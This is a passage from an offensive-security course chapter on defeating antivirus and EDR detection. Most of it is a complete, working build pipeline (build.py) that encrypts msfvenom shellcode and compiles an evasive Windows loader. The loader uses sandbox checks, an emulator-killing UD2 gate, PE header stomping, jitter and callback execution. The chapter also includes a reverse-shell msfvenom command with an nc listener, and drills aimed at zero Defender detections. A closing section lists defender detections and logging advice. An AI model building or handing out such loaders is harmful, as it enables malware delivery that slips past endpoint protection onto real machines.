Regular beacon intervals (check in every 30 seconds, exactly) are detected
by network analysis tools — they look for machines that call home on a
clock. Add jitter: a random delay added to the base interval.

```python
# Jitter calculation (server-side or implant-side)
import random, time

base_sleep = 30          # 30 second base interval
jitter_percent = 30      # +-30% variation

while True:
    # ... execute task ...
    jitter = base_sleep * (jitter_percent / 100.0)      # 30% of base = 9 seconds
    actual_sleep = base_sleep + random.uniform(-jitter, jitter)  # 21-39 seconds
    time.sleep(actual_sleep)   # sleep random amount — no regular timing signature
```

---

## Section 6 — Building a Full Evasion Pipeline

No single technique defeats all five gates. Evasion is a pipeline — each
layer addressed in sequence:

```
EVASION PIPELINE: IRON-DOME ARCHITECTURE

RAW SHELLCODE (msfvenom / custom)
    │
    ▼ [Gate 1 fix: AES-256-CBC encrypt]
ENCRYPTED BLOB (random-noise bytes — no signature match)
    │
    ▼ [Gate 2 fix: API hashing + string encryption + PE cleanup]
CLEAN LOADER (no suspicious strings, no flagged imports, stripped PE)
    │
    ▼ [Gate 3 fix: indirect syscalls + callback execution + sandbox check]
RUNTIME BEHAVIOR (no VirtualAlloc→CreateThread chain; no EDR hooks triggered)
    │
    ▼ [Gate 4 fix: encrypted sleep + PE header stomp]
MEMORY FOOTPRINT (no plaintext shellcode during sleep; no MZ header in memory)
    │
    ▼ [Gate 5 fix: HTTPS C2 + jittered timing + spoofed headers]
C2 TRAFFIC (looks like normal browser traffic to a web service)
    │
    ▼
EXECUTION ON TARGET
```

Each layer in the pipeline peels off one detection mechanism. The pipeline
is not a recipe you follow blindly — it's a framework. When a new detection
technique emerges, you identify which gate it operates at and add the
appropriate counter to that layer.

### The Arms Race

Every bypass listed in this chapter has a detection method:

```
Technique            Defender Counter
─────────────────    ──────────────────────────────────────────────
AES-encrypted blob   Behavioral detonation sandbox — decrypt at runtime
Dynamic API resolve  ETW hook on PEB walk — observe which exports are resolved
Direct syscalls      Kernel ETW — monitor syscall instruction at ring 0
Callback execution   Enumerate known callback patterns + monitor return addresses
Encrypted sleep      Stack unwinding checks — sleeping thread with no stack frames
Module stomping      Compare in-memory image bytes to on-disk PE bytes
HTTPS C2             JA3/JA3S fingerprint — TLS client hello fingerprint detection
```

Your job is not to memorize a list of tricks. It's to understand the
MECHANISM behind each gate so you can adapt when the current bypass gets burned.
That understanding is the same thing you need to defend your own infrastructure —
which is why this chapter exists.

---

## IRON-DOME Build — Putting All 8 Layers Together

### WHAT IT IS

IRON-DOME is the 22DIV full evasion build pipeline. It takes raw shellcode
as input and produces a compiled .exe that applies every layer in sequence:
XOR encode, AES encrypt, dynamic API resolution, sandbox checks, ISUN gate,
PE header stomp, execution jitter, and HTTPS C2. Each layer is applied by
a separate step orchestrated by a Python build script.

### WHY IT MATTERS

Running these steps manually on every build is error-prone and slow. The
build script ensures every layer is applied in the correct order, keys are
regenerated per-build, and the final binary is stripped. One command builds
a fresh variant every time.

### HOW TO BUILD IT

**Full build.py — orchestrates all 8 layers:**

```python
#!/usr/bin/env python3
# build.py — IRON-DOME full evasion build pipeline
# Usage: python build.py shellcode.bin
# Output: iron_dome.exe
#
# Requirements:
#   pip install pycryptodome
#   MinGW-w64 on PATH (x86_64-w64-mingw32-gcc)
#
# Pipeline order:
#   1. Read raw shellcode
#   2. Rolling XOR encode
#   3. AES-256-CBC encrypt the XOR'd blob
#   4. Emit C source (loader) with all keys embedded
#   5. Compile with MinGW: -s -O2 -mwindows
#   6. Strip .comment section
#   7. Report file size and hash

import sys
import os
import subprocess
import hashlib
import struct

# ---- pycryptodome imports ----
try:
    from Crypto.Cipher import AES
    from Crypto.Random import get_random_bytes
    from Crypto.Util.Padding import pad
except ImportError:
    print("[-] pycryptodome not installed. Run: pip install pycryptodome")
    sys.exit(1)

# ---- Configuration ----
XOR_KEY   = b"\x56\x41\x44\x45\x52\x30\x78\x31"  # "VADER0x1" — change per op
GCC       = "x86_64-w64-mingw32-gcc"
STRIP     = "x86_64-w64-mingw32-strip"
OUT_DIR   = "."

def rolling_xor(data: bytes, key: bytes) -> bytes:
    """Rolling XOR: each byte XOR'd with key[i % len(key)]."""
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

def aes_encrypt(data: bytes) -> tuple:
    """AES-256-CBC encrypt. Returns (ciphertext, key, iv)."""
    key = get_random_bytes(32)    # fresh key every build
    iv  = get_random_bytes(16)    # fresh IV every build
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ct = cipher.encrypt(pad(data, AES.block_size))
    return ct, key, iv

def to_c_array(name: str, data: bytes) -> str:
    """Format bytes as a C static array literal."""
    lines = [f"static unsigned char {name}[] = {{"]
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]
        hex_str = ", ".join(f"0x{b:02x}" for b in chunk)
        lines.append(f"    {hex_str},")
    lines.append("};")
    lines.append(f"static SIZE_T {name}_len = {len(data)};")
    return "\n".join(lines)

def emit_c_source(xor_key: bytes, aes_ct: bytes, aes_key: bytes,
                   aes_iv: bytes, raw_len: int) -> str:
    """Generate the complete C loader source with all keys embedded."""
    xor_key_hex = ", ".join(f"0x{b:02x}" for b in xor_key)
    return f"""
/*
 * IRON-DOME Loader — auto-generated by build.py
 * DO NOT EDIT MANUALLY — regenerate with: python build.py shellcode.bin
 * Layers: XOR + AES-CBC + dynamic API + ISUN gate + sandbox check +
 *         PE stomp + execution jitter + encrypted sleep
 */
#include <windows.h>
#include <bcrypt.h>
#include <d3d11.h>
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "d3d11.lib")

/* ---- Embedded keys and payload ---- */
static unsigned char XOR_KEY[] = {{ {xor_key_hex} }};
static SIZE_T XOR_KEY_LEN = {len(xor_key)};

{to_c_array("AES_KEY", aes_key)}

{to_c_array("AES_IV", aes_iv)}

{to_c_array("PAYLOAD", aes_ct)}

/* Original shellcode size before encoding (for verification) */
static SIZE_T ORIGINAL_SC_LEN = {raw_len};

/* ---- ISUN Gate macro ---- */
/* UD2 instruction — kills AV emulators that follow the dead branch */
#define ISUN_GATE() __asm__ volatile (".byte 0x0f, 0x0b" ::: "memory")

/* ---- Jitter sleep ---- */
static void jitter_sleep(DWORD min_ms, DWORD max_ms) {{
    srand((unsigned int)(GetTickCount64() & 0xFFFFFFFF));
    DWORD wait = min_ms + (rand() % (max_ms - min_ms + 1));
    Sleep(wait);
}}

/* ---- Sandbox detection ---- */
static BOOL is_sandbox(void) {{
    /* Check 1: sleep acceleration */
    ULONGLONG t0 = GetTickCount64();
    Sleep(2000);
    if ((GetTickCount64() - t0) < 1800) return TRUE;

    /* Check 2: CPU count */
    SYSTEM_INFO si; GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 4) return TRUE;

    /* Check 3: RAM < 4GB */
    MEMORYSTATUSEX ms; ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    if (ms.ullTotalPhys < (DWORDLONG)4*1024*1024*1024) return TRUE;

    /* Check 4: No GPU */
    ID3D11Device *dev = NULL;
    D3D_FEATURE_LEVEL fl;
    HRESULT hr = D3D11CreateDevice(NULL, D3D_DRIVER_TYPE_HARDWARE,
                                    NULL, 0, NULL, 0,
                                    D3D11_SDK_VERSION, &dev, &fl, NULL);
    if (dev) dev->lpVtbl->Release(dev);
    if (FAILED(hr)) return TRUE;

    return FALSE;
}}

/* ---- AES-CBC decrypt via Windows CNG ---- */
static BOOL aes_cbc_decrypt(unsigned char *ct, DWORD ct_len,
                              unsigned char *key, DWORD key_len,
                              unsigned char *iv,
                              unsigned char **pt, DWORD *pt_len) {{
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    if (!NT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0)))
        return FALSE;
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                      (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                      sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, key, key_len, 0);
    BCryptDecrypt(hKey, ct, ct_len, NULL, iv, 16, NULL, 0, pt_len, BCRYPT_BLOCK_PADDING);
    *pt = (unsigned char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *pt_len);
    BCryptDecrypt(hKey, ct, ct_len, NULL, iv, 16, *pt, *pt_len, pt_len, BCRYPT_BLOCK_PADDING);
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return TRUE;
}}

/* ---- PE header stomp ---- */
static void pe_stomp(PVOID base) {{
    DWORD old;
    VirtualProtect(base, 4096, PAGE_READWRITE, &old);
    SecureZeroMemory(base, 4096);
    VirtualProtect(base, 4096, PAGE_READONLY, &old);
}}

/* ---- Main entry ---- */
int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR cmd, int show) {{
    (void)h; (void)p; (void)cmd; (void)show;

    /* Layer 3: ISUN Gate — kills AV emulators */
    if (GetTickCount64() == 0) {{ ISUN_GATE(); }}

    /* Layer 3: Sandbox check — exit silently in analysis env */
    if (is_sandbox()) ExitProcess(0);

    /* Layer 6: Pre-execution jitter */
    jitter_sleep(200, 900);

    /* Layers 1+2: AES decrypt then XOR decode */
    unsigned char *xor_blob = NULL;
    DWORD xor_blob_len = 0;
    if (!aes_cbc_decrypt(PAYLOAD, (DWORD)PAYLOAD_len,
                          AES_KEY, (DWORD)AES_KEY_len,
                          AES_IV, &xor_blob, &xor_blob_len))
        ExitProcess(1);

    /* XOR decode in-place */
    for (DWORD i = 0; i < xor_blob_len; i++)
        xor_blob[i] ^= XOR_KEY[i % XOR_KEY_LEN];

    /* Layer 6: Post-decode jitter */
    jitter_sleep(100, 400);

    /* Allocate RW, copy, protect RX */
    LPVOID mem = VirtualAlloc(NULL, xor_blob_len,
                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) ExitProcess(1);
    memcpy(mem, xor_blob, xor_blob_len);
    HeapFree(GetProcessHeap(), 0, xor_blob);   /* wipe decode buffer */

    DWORD old;
    VirtualProtect(mem, xor_blob_len, PAGE_EXECUTE_READ, &old);

    /* Layer 4: PE header stomp on our own allocation base */
    pe_stomp(mem);

    /* Layer 6: Pre-execute jitter */
    jitter_sleep(50, 300);

    /* Execute via callback — no CreateThread in call stack */
    EnumDesktopsA(GetProcessWindowStation(),
                  (DESKTOPENUMPROCA)mem, 0);

    VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}}
"""

def run(cmd: list, desc: str) -> int:
    """Run a subprocess command, print status."""
    print(f"[*] {desc}")
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"[-] FAILED: {result.stderr}")
    else:
        print(f"[+] OK")
    return result.returncode

def main():
    if len(sys.argv) < 2:
        print(f"Usage: python build.py shellcode.bin")
        sys.exit(1)

    sc_path = sys.argv[1]
    with open(sc_path, "rb") as f:
        raw = f.read()
    print(f"[*] Read {len(raw)} bytes of raw shellcode from {sc_path}")

    # Layer 1: Rolling XOR encode
    print(f"[*] Applying Layer 1: Rolling XOR (key: {XOR_KEY.hex()})")
    xor_encoded = rolling_xor(raw, XOR_KEY)

    # Layer 2: AES-256-CBC encrypt the XOR'd blob
    print(f"[*] Applying Layer 2: AES-256-CBC encrypt")
    aes_ct, aes_key, aes_iv = aes_encrypt(xor_encoded)
    print(f"[+] AES key: {aes_key.hex()}")
    print(f"[+] AES IV:  {aes_iv.hex()}")
    print(f"[+] Ciphertext size: {len(aes_ct)} bytes")

    # Emit C source
    c_source = emit_c_source(XOR_KEY, aes_ct, aes_key, aes_iv, len(raw))
    c_path = os.path.join(OUT_DIR, "iron_dome_gen.c")
    with open(c_path, "w") as f:
        f.write(c_source)
    print(f"[+] C source written: {c_path}")

    # Compile
    exe_path = os.path.join(OUT_DIR, "iron_dome.exe")
    ret = run([
        GCC, c_path, "-o", exe_path,
        "-s",           # strip symbols
        "-O2",          # optimise
        "-mwindows",    # GUI subsystem — no console window
        "-static",      # static CRT link
        "-lbcrypt",     # BCrypt for AES
        "-ld3d11",      # D3D11 for GPU check
    ], "Compiling iron_dome.exe with MinGW")
    if ret != 0:
        sys.exit(1)

    # Strip .comment section (contains GCC version string)
    run([STRIP, "--remove-section=.comment", exe_path],
        "Stripping .comment section")

    # Report
    size = os.path.getsize(exe_path)
    with open(exe_path, "rb") as f:
        sha256 = hashlib.sha256(f.read()).hexdigest()
    print(f"\n[+] Build complete.")
    print(f"    Output : {exe_path}")
    print(f"    Size   : {size} bytes ({size // 1024} KB)")
    print(f"    SHA256 : {sha256}")
    print(f"\n[*] Test: Start-MpScan -ScanType 3 -File '{exe_path}'")
    print(f"[*] Listener: nc -lvnp 4444")

if __name__ == "__main__":
    main()
```

**Build command:**
```bash
# Generate shellcode first (on Kali or Linux):
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 \
  -f raw -o shellcode.bin

# Run the build pipeline (on Windows with MinGW):
python build.py shellcode.bin
```

### EXPECTED OUTPUT

```
[*] Read 460 bytes of raw shellcode from shellcode.bin
[*] Applying Layer 1: Rolling XOR (key: 5641444552307831)
[*] Applying Layer 2: AES-256-CBC encrypt
[+] AES key: 3af17c88...  (32 bytes, random per build)
[+] AES IV:  b92d...      (16 bytes, random per build)
[+] Ciphertext size: 464 bytes
[+] C source written: ./iron_dome_gen.c
[*] Compiling iron_dome.exe with MinGW
[+] OK
[*] Stripping .comment section
[+] OK

[+] Build complete.
    Output : ./iron_dome.exe
    Size   : 42496 bytes (41 KB)
    SHA256 : a3f1...

[*] Test: Start-MpScan -ScanType 3 -File './iron_dome.exe'
[*] Listener: nc -lvnp 4444
```

**Failure: `d3d11.h: No such file or directory`**
```bash
# Install D3D11 headers for MinGW:
pacman -S mingw-w64-x86_64-headers-git   # in MSYS2 terminal
# Or: download DirectX headers from microsoft/DirectX-Headers on GitHub
```

**Failure: `undefined reference to 'BCryptOpenAlgorithmProvider'`**
```bash
# Ensure -lbcrypt is in the gcc command — it must come AFTER the .c file
x86_64-w64-mingw32-gcc iron_dome_gen.c -o iron_dome.exe -lbcrypt -ld3d11
```

// DRILL: Build IRON-DOME from source, run against EICAR, confirm 0/1 detection.
// Steps:
// 1. msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o shellcode.bin
// 2. python build.py shellcode.bin
// 3. On a VM with Defender enabled: copy iron_dome.exe to Desktop
// 4. PowerShell: Start-MpScan -ScanType 3 -File "$env:USERPROFILE\Desktop\iron_dome.exe"
// 5. Get-MpThreatDetection — should return nothing (no detection)
// 6. Run iron_dome.exe — calc.exe should open
// 7. Check Windows Security → Protection History — no alerts
// Goal: 0 detections across static scan + runtime execution.

---

## A Note on `defender_scan.exe` and `xor_encode.exe`

The interactive exercises for this chapter (in the terminal replay widget)
show two commands:

```
C:\lab> defender_scan.exe payload.exe
C:\lab> xor_encode.exe payload.exe --key 0x4D
```

**These are fictional placeholder tools used for illustration only.** They
do not exist. No download link. No package. If you spend time searching for
them, you will find nothing.

Here is what you actually use in the real workflow:

**Scanning for detection rate:**
- Upload to **VirusTotal** (virustotal.com) — shows detection across 70+ AV engines.
  WARNING: never upload real operational payloads. Submissions are public.
- Run locally with **Windows Defender command line**:
  ```powershell
  # Trigger Defender scan on a specific file (admin not required)
  Start-MpScan -ScanType 3 -File "C:\lab\payload.exe"
  # Check result: Get-MpThreatDetection (lists any threats found)
  ```
- Use **DefenderCheck** (github.com/matterpreter/DefenderCheck):
  ```powershell
  DefenderCheck.exe payload.exe
  # Binary-searches through your file to find the exact byte range Defender flags
  ```

**XOR encoding:**
- Use the Python script from Section 1 (`xor_encoder.py`) — you just wrote it.
- Or compile your own `xor_encode.exe` using the C code in Section 1.
  Building your own tools is the point of this course.

The fictional terminal demo shows you WHAT the workflow looks like.
The Python scripts and C code in this chapter give you the ACTUAL TOOLS
to replicate it. Every tool in this chapter is either installed via `winget`/`pip`,
or is code you compile yourself.

---

## DEFENDER TAKEAWAY

This is the chapter defenders most need to understand. Everything above
describes what an attacker does — and therefore exactly what you should
be watching for and blocking.

- **Enable Defender's memory integrity (HVCI) in Windows Security → Device Security → Core Isolation.** This prevents unsigned kernel code from running, which closes BYOVD attacks used to disable Defender before payload delivery. Go do this right now if it's not enabled.

- **Watch Event ID 4688 (Process Creation) with command line logging enabled.** Enable it via GPO: `Computer Configuration → Windows Settings → Security Settings → Advanced Audit Policy → Detailed Tracking → Audit Process Creation`. Every process spawn creates an event. Unusual parent-child pairs (Word spawning cmd.exe, svchost spawning unknown processes) are Gate 3 behavioral IOCs.

- **Watch Event ID 7045 (New Service Installed) and 4697 (Service Installed in Audit Log).** Payload persistence via services fires these. Alert on any new service installed outside of your approved change window.

- **Watch Event ID 10 (ProcessAccess) in Sysmon if deployed.** `OpenProcess` with `PROCESS_VM_WRITE` against processes you don't own is injection. Alert on any process reading/writing memory of svchost.exe, lsass.exe, or explorer.exe unless it's a known legitimate tool.

- **Block outbound traffic by default, whitelist by exception.** Gate 5 evasion becomes significantly harder when your C2 beacon can't reach anything on the internet. Only allow known-good destinations. Beacons over HTTPS to unknown CDN IPs show up as anomalous DNS and connection logs.

- **Enable Defender's cloud-delivered protection and automatic sample submission.** Novel payloads that pass local static scans often get caught by cloud ML within minutes of the first submission from any machine globally. "First seen" events are a detection trigger.

- **Log PowerShell (Event IDs 4103, 4104 — Script Block Logging).** Enable via GPO: `Administrative Templates → Windows Components → Windows PowerShell → Turn on PowerShell Script Block Logging`. Every PowerShell block executed gets logged — fileless delivery via IEX cradles is immediately visible.

- **Deploy Sysmon with a baseline ruleset (SwiftOnSecurity's config).** Sysmon adds Event ID 3 (Network Connection), 7 (Image Loaded), 8 (CreateRemoteThread), 10 (ProcessAccess), 11 (FileCreate), 25 (ProcessTampering) — the entire behavioral chain described in this chapter becomes visible in your event log. Download config: github.com/SwiftOnSecurity/sysmon-config.

---

## Key Terms

| Term | Definition |
|------|-----------|
| **Five-gate model** | 22DIV framework classifying AV/EDR detection into five sequential layers: static signature, heuristic, behavioral, memory scanning, and network/cloud detection |
| **IRON-DOME** | 22DIV evasion pipeline that addresses each of the five gates in sequence — encryption, PE cleanup, syscall bypass, memory re-encryption, and HTTPS C2 |
| **Static signature** | Byte pattern matching at file-scan time; defeated by encrypting the payload so the scanner sees no recognizable bytes |
| **Heuristic analysis** | Pattern-based analysis of code structure and import tables before execution; defeated by dynamic API resolution and PE anomaly cleanup |
| **Behavioral detection** | Runtime monitoring of API call sequences via ntdll.dll hooks; defeated by direct/indirect syscalls that skip ntdll entirely |
| **Memory scanning** | Periodic scan of process memory for shellcode signatures; defeated by encrypted sleep (re-encrypt during sleep) and PE header stomping |
| **Gate 5 / network detection** | Monitoring of C2 traffic signatures and destination reputation; defeated by HTTPS with valid cert, jittered timing, and malleable profiles |
| **XOR encoding** | Scramble every payload byte with a key; single-byte XOR is crackable by trying all 256 keys; rolling/multi-byte XOR is harder |
| **Per-vector key isolation** | Using a different XOR key byte for each position (rolling key); defeats frequency analysis that breaks single-byte XOR |
| **AES-CBC** | AES encryption in Cipher Block Chaining mode; 256-bit random key per payload makes static analysis impossible without the key |
| **Dynamic API resolution** | Calling `GetProcAddress` at runtime to find function addresses rather than importing them statically; removes suspicious strings from the binary |
| **API hashing** | Walking export tables and matching by hash value; eliminates all function name strings from the binary entirely |
| **Direct syscall** | Calling the Windows kernel directly via inline `syscall` assembly instruction, bypassing ntdll.dll and its EDR hooks |
| **Hell's Gate** | Technique to dynamically read syscall numbers (SSNs) from ntdll's in-memory stubs, enabling direct syscalls without hardcoded numbers |
| **Halo's Gate** | Extension of Hell's Gate for when the target function is already hooked; reads SSN from neighboring functions and adjusts by offset |
| **Callback execution** | Executing shellcode by passing its address as a Windows callback function (EnumDesktopsA, CreateTimerQueueTimer etc.) instead of CreateThread |
| **Encrypted sleep** | Re-encrypting the shellcode in memory before sleeping, decrypting on wake; closes the memory-scan window during idle periods |
| **PE header stomping** | Zeroing the MZ/PE headers of a loaded payload after execution begins; defeats malfind-style forensic tools that scan for PE signatures |
| **Module stomping** | Overwriting the .text section of a loaded legitimate DLL with shellcode; memory scanners see a legitimate module address |
| **Sandbox detection** | Checking environmental indicators (RAM, CPU count, disk size, VM artifacts) before executing; payload exits if analysis environment is detected |
| **ISUN Gate** | Invalid Syscall / Undefined iNstruction — a dead branch containing UD2 that kills AV emulators while real hardware skips it |
| **UD2** | x86-64 opcode 0x0F 0x0B — guaranteed undefined instruction; raises EXCEPTION_ILLEGAL_INSTRUCTION on real hardware; crashes emulators |
| **Jitter** | Random variation added to beacon sleep intervals and execution stage timing; defeats ML heuristic timing profiles and network analysis |
| **HVCI** | Hypervisor-Protected Code Integrity (Memory Integrity); prevents unsigned kernel code from running, closing BYOVD attack chains |
| **Sysmon Event 8** | CreateRemoteThread event — logged every time a thread is created in a different process; primary detection event for injection |
| **Event ID 4688** | Process creation event in Windows Security log; with command-line auditing enabled, captures every process launch with arguments |
| **FNV-1a** | Fowler-Noll-Vo hash function variant; used for API hashing — fast, 32-bit, low collision rate for export table walking |
| **Sleep acceleration** | Sandbox technique that speeds up time to compress analysis into 60s; detected by comparing GetTickCount64() before/after Sleep() |

---

## Drill 12 — Antivirus Evasion Lab

Go to `DRILLS/12_av_evasion/`. A Windows 11 VM with Defender enabled and
real-time protection ON. Your target is to deliver shellcode and execute it
without triggering a Defender alert.

Your missions:

1. **Gate 1 baseline**: Compile a raw shellcode loader from Chapter 09
   (unencoded, plain VirtualAlloc + CreateThread). Drop it on the VM.
   Document whether Defender fires and at what stage (on write, on execute).
   This is your baseline — everything you do next is measured against it.

2. **XOR encode**: Run `xor_encode_full.py` on your shellcode with the VADER key.
   Embed the encoded bytes. Add the decode stub. Recompile. Drop on VM.
   Does Defender fire on write? On execute? Document the result.

3. **AES encrypt**: Run `aes_encryptor.py` on your shellcode. Embed the
   encrypted blob, key, and IV. Add the BCrypt decrypt stub. Recompile.
   Strip PE. Drop on VM. Document result.

4. **Dynamic imports**: Remove all static imports of `VirtualAlloc`,
   `VirtualProtect`, `CreateThread`. Replace with hash-based export walking
   (dynapi.c pattern). Recompile. Drop on VM.
   Does heuristic analysis fire differently?

5. **Sandbox check + ISUN gate**: Add `IsLikelySandbox()` and the ISUN gate
   to the loader. Set VM to 2 vCPUs — confirm loader exits. Set to 8 vCPUs —
   confirm loader executes.

6. **Callback execution**: Replace `CreateThread` with `EnumDesktopsA`.
   Verify Defender's behavioral engine reacts differently. Document which
   Sysmon event IDs fire with CreateThread vs EnumDesktopsA.

7. **Memory scan window**: Add encrypted sleep stub. Use Process Hacker
   to monitor the memory region during the sleep window. Confirm permissions
   switch from RX to RW and back. Confirm byte content is encrypted during sleep.

8. **PE header stomp**: Call pe_stomp_headers() immediately after mapping.
   Attach x64dbg BEFORE stomp — observe MZ at base. Detach, let stomp run,
   reattach — confirm MZ is gone.

9. **IRON-DOME full build**: Run `python build.py shellcode.bin`.
   Scan with Defender. Execute. What is the detection rate? How many gates
   does it now pass? Document every Sysmon event that fires (or doesn't).

For each stage: document what triggered (if anything), which Event IDs fired
in Windows Security log, and what Process Hacker showed for the memory region.

The deliverable is a lab report documenting which technique defeated which
gate. Not a working payload — the understanding of WHY each layer worked.

---

— PAYLOAD encrypted, headers STOMPED, the scanner's window
closes before the pattern lands on ANYTHING it knows
